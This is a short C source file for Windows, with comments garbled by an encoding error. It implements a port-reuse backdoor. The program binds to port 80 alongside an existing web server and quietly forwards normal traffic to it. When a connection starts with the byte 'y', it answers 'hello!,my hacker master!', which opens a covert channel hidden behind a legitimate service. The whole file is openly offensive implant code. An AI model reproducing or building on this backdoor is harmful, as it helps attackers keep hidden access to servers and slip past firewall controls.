#include <stdio.h>
#include <WINSOCK2.H> //����SOCKET��ͷ�ļ������ӿ�
#pragma comment (lib,"Ws2_32.lib")

//���ö˿ڳ���������������������ֹ��ܵ�SOCKET

void proc(LPVOID d); //�����߳�

int main(int argc,char *argv[])
{
	//��ʼ��SOCKET����
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2,2),&wsaData); //socket�汾
	
	SOCKADDR_IN a,b; //һ���������ⲿ�����ĵ�ַ��һ���ǽ��յ�acceptʱ�õ����ڴ�����յĽṹ
	a.sin_family = AF_INET;
	a.sin_addr.s_addr=inet_addr(argv[1]);
	a.sin_port = htons(80);
	
	SOCKET c; //socket c�����ڼ�����SOCKET
	c=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	bool l = TRUE;
	setsockopt(c,SOL_SOCKET,SO_REUSEADDR,(char *)&l,sizeof(l)); //���ö˿�����
	bind(c,(sockaddr*)&a,sizeof(a));//��
	listen(c,100); //����
	
	while(1)
	{
		int x;
		x = sizeof(b);
		SOCKET d = accept(c,(sockaddr*)&b,&x);//socket d�ǵ����յ�����ʱ�õ�socket,������sokcetֻ��һ����
		//������յ���socket���ж����������������
		CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)proc,(LPVOID)d,0,0);
	}
	closesocket(c);
	return 0;
	
}

void proc(LPVOID d)
{
	SOCKADDR_IN sa; //��������WEB 80 �˿ڵ�SOCKET�Ľṹ������൱�ڿͻ��˳��������������ӣ�,
	//��������SOCKETֻ��һ��
	sa.sin_family = AF_INET;
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
	sa.sin_port = htons(80);
	SOCKET web = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	
	connect(web,(sockaddr*)&sa,sizeof(sa)); //�ô��̳߳�������web
	char buf[4096];
	SOCKET ss = (SOCKET)d; //�Ѵ������Ĵ������ӵ�SOCKET����ss
	while(1)
	{
		int n = recv(ss,buf,4096,0);//���ⲿ����d(��SS)�յ�����
		if(n==0) //û������
			break;
		if(n>0 && buf[0] =='y')
		{
			send(ss,"hello!,my hacker master!",25,0);//���Ŵ�����������
		}
		else
		{
			send(web,buf,n,0);//�������HACKER��������Ϣ������Ϣ����WEB��������ڷ������ڲ�,��127.0.0.1��
			n=recv(web,buf,4096,0);//���յ�����������򷵻ص���Ϣ
			if(n==0) //�����������������û�з�����Ϣ�����˳�
				break;
			else
				send(ss,buf,n,0);//������ѷ�����������Ϣ�����ͻ��ˣ��൱�ڿͻ�����û�ж�����Ϊ���û���
		}
	}
	closesocket(ss);
	
}